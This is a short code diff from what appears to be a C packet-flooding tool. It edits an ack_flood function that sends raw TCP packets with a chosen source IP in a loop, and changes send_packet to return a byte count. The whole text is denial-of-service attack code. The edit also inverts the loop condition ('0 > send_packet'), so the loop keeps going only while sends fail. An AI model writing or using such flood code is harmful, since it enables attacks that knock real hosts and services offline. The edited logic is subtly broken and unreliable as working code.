@@ -21,7 +21,7 @@ bool ack_flood(     char *srcIP,
     int i;
     bool b = true;
     for (i = 0; i < n && b; ++i) {
-        b = send_packet(socket_fd, packet, addr_in);
+        b =  0 > send_packet(socket_fd, packet, addr_in);
         tcpHdr->seq = htonl(seq + i);
     }
 
@@ -30,16 +30,12 @@ bool ack_flood(     char *srcIP,
     return b;
 }
 
-bool send_packet(int socket_fd, char *packet, struct sockaddr_in addr_in) {
+int send_packet(int socket_fd, char *packet, struct sockaddr_in addr_in) {
     int bytes;
     struct iphdr *ipHdr = (struct iphdr *) packet;
 
-    if((bytes = sendto(socket_fd, ipHdr, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0) {        
-        return false;
-    }
-    else {        
-        return true;
-    }
+    bytes = sendto(socket_fd, ipHdr, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in));
+    return bytes;
 }
 
 void fill_packet(   char *srcIP,
